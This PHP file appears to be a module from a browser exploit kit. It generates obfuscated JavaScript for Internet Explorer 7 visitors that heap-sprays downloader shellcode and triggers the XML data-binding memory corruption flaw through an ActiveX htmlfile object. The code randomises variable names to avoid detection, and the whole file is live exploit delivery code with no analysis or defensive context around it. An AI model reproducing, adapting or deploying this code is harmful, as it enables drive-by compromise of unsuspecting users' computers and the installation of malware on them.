<?php 
$randVar = $GLOBALS["cpFunctions"]->CreateArrayString(rand(10, 30), "100");
$strUrl = $GLOBALS["cpXplHelper"]->GetURL("other", $browser, $os, "xml");
if( $browser == "ie" && $version == 7 ) 
{
    $functionName = $ExploitFunctions[11];
    $replaceFunction = $GLOBALS["cpFunctions"]->RandAlpha(2);
    $eArray[] = "\r\nfunction " . $functionName . "(){\r\n\tvar " . $randVar[0] . " = '" . $GLOBALS["cpXplHelper"]->GetJSShellcode($strUrl, $replaceFunction) . "'.replace(/" . $replaceFunction . "/g,'Au'.replace(/A/g,'B').replace(/B/g,unescape('%25')));\r\n    var " . $randVar[2] . " = 0x0c0c0c0c;\r\n    var " . $randVar[1] . " = unescape;\r\n\tvar " . $randVar[3] . " = " . $randVar[1] . "(" . $randVar[0] . ");\r\n    var " . $randVar[4] . " = 0x100000;\r\n    var " . $randVar[5] . " = " . $randVar[3] . ".length * 2;\r\n    var " . $randVar[6] . " = " . $randVar[4] . " - (" . $randVar[5] . " + 0x038);\r\n    var " . $randVar[7] . " = " . $randVar[1] . "(\"%u0a0a%u0a0a\");\r\n    while (" . $randVar[7] . ".length * 2 < " . $randVar[6] . ") {\r\n\t\t" . $randVar[7] . " += " . $randVar[7] . ";\r\n\t}\r\n\t" . $randVar[7] . " = " . $randVar[7] . ".substring(0, " . $randVar[6] . " / 2);\r\n    " . $randVar[8] . " = (" . $randVar[2] . " - 0x100000) / " . $randVar[4] . ";\r\n    " . $randVar[10] . " = new Array();\r\n    for (" . $randVar[13] . " = 0; " . $randVar[13] . " < " . $randVar[8] . "; " . $randVar[13] . "++) {\r\n\t\t" . $randVar[10] . "[" . $randVar[13] . "] = " . $randVar[7] . " + " . $randVar[3] . ";\r\n\t}\r\n\t" . $randVar[9] . " = {};\r\n\t" . $randVar[12] . " = 0;\r\n\tfor (" . $randVar[13] . " = 0; " . $randVar[13] . " < 1; " . $randVar[13] . "++) {\r\n\t\t" . $randVar[10] . " = " . $randVar[10] . ";\r\n\t\t" . $randVar[9] . "[" . $randVar[12] . " + " . $randVar[13] . "] = new ActiveXObject(\"htmlfile\");\r\n \t\t" . $randVar[10] . " = " . $randVar[10] . ";\r\n\t\t" . $randVar[11] . " = '<XML ID=F><X><D><![CDATA[<image src=http://&#' + (2570 - " . $randVar[13] . ") + ';&#2570;.example.com>]]></D></X></XML><SPAN DATASRC=#F DATAFLD=D DATAFORMATAS=HTML><XML ID=F></XML><SPAN DATASRC=#F DATAFLD=D DATAFORMATAS=HTML></SPAN></SPAN>';\r\n\t\t" . $randVar[10] . " = " . $randVar[10] . ";\r\n\t\t" . $randVar[9] . "[" . $randVar[12] . " + " . $randVar[13] . "].open();\r\n\t\t" . $randVar[10] . " = " . $randVar[10] . ";\r\n\t\t" . $randVar[9] . "[" . $randVar[12] . " + " . $randVar[13] . "].write(" . $randVar[11] . ");\r\n\t\t" . $randVar[10] . " = " . $randVar[10] . ";\r\n\t\t" . $randVar[9] . "[" . $randVar[12] . " + " . $randVar[13] . "].close();\r\n\t\t" . $randVar[10] . " = " . $randVar[10] . ";\r\n\t}\r\n\t{next}\r\n}";
}

echo "\t\t\t";

